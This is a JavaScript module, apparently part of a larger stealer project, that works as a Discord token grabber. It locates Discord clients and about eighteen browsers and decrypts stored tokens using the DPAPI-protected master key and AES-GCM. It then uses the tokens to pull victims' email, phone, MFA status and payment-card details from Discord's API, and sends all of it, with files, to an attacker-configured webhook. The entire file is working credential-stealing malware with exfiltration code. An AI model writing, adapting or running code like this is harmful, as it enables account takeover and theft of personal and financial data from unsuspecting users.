/**
 * Discord Service Module
 * Handles Discord-related functionality including data collection and webhook communication
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const dpapi = require('@primno/dpapi');
const CoreUtils = require('../../core/utils');
const { logger } = require('../../core/logger');
const { ErrorHandler, NetworkError, ModuleError } = require('../../core/errors');
const { fileManager } = require('../../core/fileManager');
const { stats } = require('../../core/statistics');
const config = require('../../config/config');

class DiscordService {
    constructor() {
        this.webhookUrl = config.get('webhook.url');
        this.timeout = config.get('webhook.timeout', 30000);
        this.discordPaths = this.getDiscordPaths();
    }

    /**
     * Get Discord installation paths
     * @returns {Object} Discord paths configuration
     */
    getDiscordPaths() {
        const appData = process.env.APPDATA || '';
        const localAppData = process.env.LOCALAPPDATA || '';

        return {
            discord: {
                name: 'Discord',
                basePaths: [
                    path.join(appData, 'discord'),
                    path.join(appData, 'Discord')
                ]
            },
            discordCanary: {
                name: 'Discord Canary',
                basePaths: [
                    path.join(appData, 'discordcanary')
                ]
            },
            discordPTB: {
                name: 'Discord PTB',
                basePaths: [
                    path.join(appData, 'discordptb')
                ]
            },
            lightcord: {
                name: 'Lightcord',
                basePaths: [
                    path.join(appData, 'Lightcord')
                ]
            }
        };
    }

    /**
     * Get browser paths for Discord tokens
     * @returns {Array} Array of browser paths
     */
    getBrowserPaths() {
        const appData = process.env.APPDATA || '';
        const localAppData = process.env.LOCALAPPDATA || '';

        return [
            path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
            path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Epic Privacy Browser', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Google', 'Chrome SxS', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Sputnik', 'Sputnik', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, '7Star', '7Star', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'CentBrowser', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Orbitum', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Kometa', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Torch', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Amigo', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'uCozMedia', 'Uran', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb')
        ];
    }

    /**
     * Collect Discord account data
     * @returns {Promise<Array>} Array of Discord accounts
     */
    async collectAccounts() {
        logger.info('Starting Discord account collection');

        const accounts = [];
        const allTokens = new Set();

        try {
            // Collect tokens from Discord applications
            for (const [clientKey, clientConfig] of Object.entries(this.discordPaths)) {
                try {
                    const clientTokens = await this.collectClientTokens(clientKey, clientConfig);
                    clientTokens.forEach(token => allTokens.add(token));
                } catch (error) {
                    ErrorHandler.handle(
                        new ModuleError(`Failed to collect tokens from ${clientConfig.name}`, 'discord'),
                        null,
                        { client: clientKey }
                    );
                }
            }

            // Collect tokens from browsers
            try {
                const browserTokens = await this.collectBrowserTokens();
                browserTokens.forEach(token => allTokens.add(token));
            } catch (error) {
                ErrorHandler.handle(
                    new ModuleError('Failed to collect tokens from browsers', 'discord'),
                    null,
                    { source: 'browsers' }
                );
            }

            // Get account information for all unique tokens
            for (const token of allTokens) {
                try {
                    const accountData = await this.getAccountInfo(token);
                    if (accountData) {
                        // Create individual folder for each Discord account
                        const accountFolderName = this.getAccountFolderName(accountData);
                        const folderPath = `Discord/${accountFolderName}`;
                        
                        // Save token to token.txt file in account's folder
                        fileManager.saveText(token, folderPath, 'token.txt');
                        
                        // Save account info as well for reference
                        fileManager.saveJson(accountData, folderPath, 'account_info.json');
                        
                        accounts.push({
                            ...accountData,
                            token: token
                        });
                    }
                } catch (error) {
                    logger.debug(`Failed to get account info for token`, error.message);
                }
            }

            // Update statistics
            for (const account of accounts) {
                stats.addDiscordAccount(account);
            }

            logger.info(`Discord account collection completed`, {
                totalAccounts: accounts.length,
                totalTokens: allTokens.size,
                clients: Object.keys(this.discordPaths).length
            });

            return accounts;
        } catch (error) {
            throw new ModuleError('Discord account collection failed', 'discord');
        }
    }

    /**
     * Extract master key from Discord Local State file
     * @param {string} basePath - Base path to Discord installation
     * @returns {Buffer|null} Master key or null if failed
     */
    getMasterKey(basePath) {
        try {
            const localStatePath = path.join(basePath, 'Local State');
            
            if (!fs.existsSync(localStatePath)) {
                return null;
            }

            const localStateData = JSON.parse(fs.readFileSync(localStatePath, 'utf-8'));
            const encryptedKey = localStateData?.os_crypt?.encrypted_key;

            if (!encryptedKey) {
                return null;
            }

            // Decode base64 and remove DPAPI prefix (first 5 bytes)
            const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
            
            // Decrypt using DPAPI
            const masterKey = dpapi.unprotectData(encrypted, null, 'CurrentUser');
            
            return masterKey;
        } catch (error) {
            logger.debug(`Failed to extract master key from ${basePath}`, error.message);
            return null;
        }
    }

    /**
     * Get encrypted tokens from leveldb files
     * @param {string} leveldbPath - Path to leveldb directory
     * @returns {Array<string>} Array of encrypted tokens
     */
    getEncryptedTokens(leveldbPath) {
        const encryptedTokens = [];

        try {
            if (!fs.existsSync(leveldbPath)) {
                return encryptedTokens;
            }

            const files = fs.readdirSync(leveldbPath);
            const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/gm;

            for (const file of files) {
                if (!(file.endsWith('.log') || file.endsWith('.ldb'))) {
                    continue;
                }

                try {
                    const filePath = path.join(leveldbPath, file);
                    const content = fs.readFileSync(filePath, 'utf-8');
                    const matches = content.match(encryptedRegex);
                    
                    if (matches) {
                        encryptedTokens.push(...matches);
                    }
                } catch (error) {
                    // Skip files that can't be read
                    continue;
                }
            }
        } catch (error) {
            logger.debug(`Failed to extract encrypted tokens from ${leveldbPath}`, error.message);
        }

        // Remove duplicates
        return [...new Set(encryptedTokens)].filter(token => token != null);
    }

    /**
     * Decrypt Discord tokens using master key
     * @param {Array<string>} encryptedTokens - Array of encrypted tokens
     * @param {Buffer} masterKey - Master key for decryption
     * @returns {Array<string>} Array of decrypted tokens
     */
    decryptTokens(encryptedTokens, masterKey) {
        const tokens = [];

        for (const encryptedToken of encryptedTokens) {
            try {
                // Extract the encrypted data after 'dQw4w9WgXcQ:' prefix
                const tokenData = Buffer.from(encryptedToken.split('dQw4w9WgXcQ:')[1], 'base64');
                
                // Extract components: iv (12 bytes), encrypted data, auth tag (16 bytes)
                const iv = tokenData.slice(3, 15);
                const encryptedData = tokenData.slice(15, tokenData.length - 16);
                const authTag = tokenData.slice(tokenData.length - 16);

                // Create decipher
                const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                decipher.setAuthTag(authTag);

                // Decrypt token
                let decryptedToken = decipher.update(encryptedData, null, 'utf-8');
                decryptedToken += decipher.final('utf-8');

                if (decryptedToken) {
                    tokens.push(decryptedToken);
                }
            } catch (error) {
                // Skip invalid tokens
                continue;
            }
        }

        return tokens;
    }

    /**
     * Collect tokens from specific Discord client
     * @param {string} clientKey - Client identifier
     * @param {Object} clientConfig - Client configuration
     * @returns {Promise<Array>} Array of tokens
     */
    async collectClientTokens(clientKey, clientConfig) {
        const tokens = [];

        for (const basePath of clientConfig.basePaths) {
            if (!fs.existsSync(basePath)) {
                continue;
            }

            try {
                // Get master key
                const masterKey = this.getMasterKey(basePath);
                if (!masterKey) {
                    logger.debug(`No master key found for ${clientConfig.name} at ${basePath}`);
                    continue;
                }

                // Get leveldb path
                const leveldbPath = path.join(basePath, 'Local Storage', 'leveldb');
                
                // Get encrypted tokens
                const encryptedTokens = this.getEncryptedTokens(leveldbPath);
                if (encryptedTokens.length === 0) {
                    continue;
                }

                // Decrypt tokens
                const decryptedTokens = this.decryptTokens(encryptedTokens, masterKey);
                tokens.push(...decryptedTokens);

                logger.debug(`Found ${decryptedTokens.length} tokens from ${clientConfig.name} at ${basePath}`);
            } catch (error) {
                logger.debug(`Failed to process ${clientConfig.name} at ${basePath}`, error.message);
            }
        }

        return tokens;
    }

    /**
     * Collect tokens from browsers
     * @returns {Promise<Array>} Array of tokens
     */
    async collectBrowserTokens() {
        const tokens = [];
        const browserPaths = this.getBrowserPaths();

        // Token patterns for direct token search in browsers
        const cleanRegex = [
            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gm,          // Standard user tokens
            /mfa\.[\w-]{84}/gm,                          // MFA tokens  
            /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/gm       // Variable length tokens
        ];

        for (const browserPath of browserPaths) {
            if (!fs.existsSync(browserPath)) {
                continue;
            }

            try {
                const files = fs.readdirSync(browserPath);
                
                for (const file of files) {
                    if (!(file.endsWith('.log') || file.endsWith('.ldb'))) {
                        continue;
                    }

                    try {
                        const filePath = path.join(browserPath, file);
                        const content = fs.readFileSync(filePath, 'utf-8');

                        for (const regex of cleanRegex) {
                            const matches = content.match(regex);
                            if (matches) {
                                tokens.push(...matches);
                            }
                        }
                    } catch (error) {
                        // Skip files that can't be read
                        continue;
                    }
                }
            } catch (error) {
                logger.debug(`Failed to process browser path ${browserPath}`, error.message);
            }
        }

        // Remove duplicates and null values
        return [...new Set(tokens)].filter(token => token != null);
    }

    /**
     * Get Discord account information from token
     * @param {string} token - Discord token
     * @returns {Promise<Object|null>} Account information
     */
    async getAccountInfo(token) {
        try {
            const response = await axios.get('https://discord.com/api/v9/users/@me', {
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                },
                timeout: 5000
            });

            const user = response.data;
            
            // Get additional account details
            const billing = await this.getBillingInfo(token);
            const nitro = this.checkNitroStatus(user);
            const badges = this.parseBadges(user.flags || 0);

            return {
                id: user.id,
                username: user.username,
                discriminator: user.discriminator,
                tag: `${user.username}#${user.discriminator}`,
                email: user.email,
                phone: user.phone,
                verified: user.verified,
                mfaEnabled: user.mfa_enabled,
                avatar: user.avatar,
                bio: user.bio || '',
                nitro: nitro,
                badges: badges,
                billings: billing,
                locale: user.locale,
                flags: user.flags
            };
        } catch (error) {
            return null;
        }
    }

    /**
     * Get billing information for Discord account
     * @param {string} token - Discord token
     * @returns {Promise<Array>} Billing information
     */
    async getBillingInfo(token) {
        try {
            const response = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                },
                timeout: 5000
            });

            return response.data.map(payment => ({
                type: payment.type,
                brand: payment.brand,
                last4: payment.last_4,
                expiresMonth: payment.expires_month,
                expiresYear: payment.expires_year
            }));
        } catch (error) {
            return [];
        }
    }

    /**
     * Check Nitro subscription status
     * @param {Object} user - User object
     * @returns {string} Nitro status
     */
    checkNitroStatus(user) {
        if (user.premium_type === 2) return 'Nitro Boost';
        if (user.premium_type === 1) return 'Nitro Classic';
        return 'None';
    }

    /**
     * Parse user badges from flags
     * @param {number} flags - User flags
     * @returns {Array<string>} Array of badge names
     */
    parseBadges(flags) {
        const badges = [];
        const badgeFlags = {
            1: 'Discord Staff',
            2: 'Discord Partner',
            4: 'HypeSquad Events',
            8: 'Bug Hunter Level 1',
            64: 'HypeSquad Bravery',
            128: 'HypeSquad Brilliance',
            256: 'HypeSquad Balance',
            512: 'Early Supporter',
            16384: 'Bug Hunter Level 2',
            131072: 'Verified Bot Developer'
        };

        for (const [flag, badge] of Object.entries(badgeFlags)) {
            if (flags & parseInt(flag)) {
                badges.push(badge);
            }
        }

        return badges;
    }

    /**
     * Get a safe folder name for Discord account
     * @param {Object} accountData - Account data
     * @returns {string} Safe folder name
     */
    getAccountFolderName(accountData) {
        // Use username#discriminator format, but make it safe for filesystem
        let folderName = accountData.tag || `${accountData.username}#${accountData.discriminator}`;
        
        // Replace unsafe characters for filesystem
        folderName = folderName.replace(/[<>:"/\\|?*]/g, '_');
        
        // Limit length to avoid filesystem issues
        if (folderName.length > 50) {
            folderName = folderName.substring(0, 47) + '...';
        }
        
        return folderName;
    }

    /**
     * Create Discord embed for account
     * @param {Object} account - Account data
     * @returns {Object} Discord embed
     */
    createAccountEmbed(account) {
        return {
            title: `📱 Discord Account: ${account.username}`,
            color: 0x7289da,
            thumbnail: {
                url: account.avatar ? 
                    `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : 
                    'https://cdn.discordapp.com/embed/avatars/0.png'
            },
            fields: [
                {
                    name: '👤 User Info',
                    value: `**Tag:** ${account.tag}\n**ID:** ${account.id}\n**Email:** ${account.email || 'N/A'}`,
                    inline: true
                },
                {
                    name: '💎 Nitro & Badges',
                    value: `**Nitro:** ${account.nitro}\n**Badges:** ${account.badges.join(', ') || 'None'}`,
                    inline: true
                },
                {
                    name: '💳 Billing',
                    value: account.billings.length > 0 ? 
                        account.billings.map(b => `${b.brand} ****${b.last4}`).join('\n') : 
                        'No payment methods',
                    inline: false
                },
                {
                    name: '🔐 Security',
                    value: `**Verified:** ${account.verified ? 'Yes' : 'No'}\n**MFA:** ${account.mfaEnabled ? 'Enabled' : 'Disabled'}`,
                    inline: true
                }
            ],
            footer: {
                text: `Token: ${account.token.substring(0, 20)}...`
            },
            timestamp: new Date().toISOString()
        };
    }

    /**
     * Send webhook message
     * @param {Object} payload - Webhook payload
     * @returns {Promise<boolean>} Success status
     */
    async sendWebhook(payload) {
        try {
            if (!this.webhookUrl || this.webhookUrl === '%WEBHOOK%') {
                logger.warn('Webhook URL not configured');
                return false;
            }

            const response = await axios.post(this.webhookUrl, payload, {
                headers: {
                    'Content-Type': 'application/json'
                },
                timeout: this.timeout
            });

            logger.debug('Webhook sent successfully', { status: response.status });
            return true;
        } catch (error) {
            throw new NetworkError(`Failed to send webhook: ${error.message}`);
        }
    }

    /**
     * Send account embeds to webhook
     * @param {Array} accounts - Array of Discord accounts
     * @returns {Promise<boolean>} Success status
     */
    async sendAccountEmbeds(accounts) {
        if (accounts.length === 0) {
            logger.info('No Discord accounts to send');
            return true;
        }

        try {
            const embeds = accounts.slice(0, 10).map(account => this.createAccountEmbed(account));
            
            const payload = {
                embeds: embeds,
                content: `🔍 Found ${accounts.length} Discord account${accounts.length !== 1 ? 's' : ''}`
            };

            return await this.sendWebhook(payload);
        } catch (error) {
            ErrorHandler.handle(error, null, { accountCount: accounts.length });
            return false;
        }
    }

    /**
     * Send file with webhook
     * @param {string} filePath - Path to file
     * @param {Object} embed - Discord embed
     * @returns {Promise<boolean>} Success status
     */
    async sendFile(filePath, embed = null) {
        try {
            const FormData = require('form-data');
            const formData = new FormData();

            if (embed) {
                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
            }

            formData.append('file', fs.createReadStream(filePath));

            const response = await axios.post(this.webhookUrl, formData, {
                headers: {
                    ...formData.getHeaders()
                },
                timeout: this.timeout
            });

            logger.debug('File sent to webhook successfully', { file: filePath, status: response.status });
            return true;
        } catch (error) {
            throw new NetworkError(`Failed to send file to webhook: ${error.message}`);
        }
    }
}

// Export the module
module.exports = {
    DiscordService
};